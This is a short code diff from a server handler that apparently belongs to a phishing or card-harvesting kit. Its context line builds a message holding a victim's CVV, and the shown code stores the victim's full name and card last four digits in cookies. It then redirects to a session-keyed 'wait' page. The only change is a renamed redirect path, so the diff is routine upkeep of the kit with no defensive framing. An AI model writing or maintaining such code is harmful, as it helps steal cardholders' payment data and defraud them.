@@ -56,5 +56,5 @@ CVV: \`${cvs}\`
   cookies.set('full_name', `${name} ${namel}`, { path: '/', httpOnly: false, sameSite: 'lax' });
   cookies.set('card_last4', ccnn1.slice(-4), { path: '/', httpOnly: false, sameSite: 'lax' });
 
-  throw redirect(303, `/wait.html?s=${sessionId}`);
+  throw redirect(303, `/wait?s=${sessionId}`);
 }
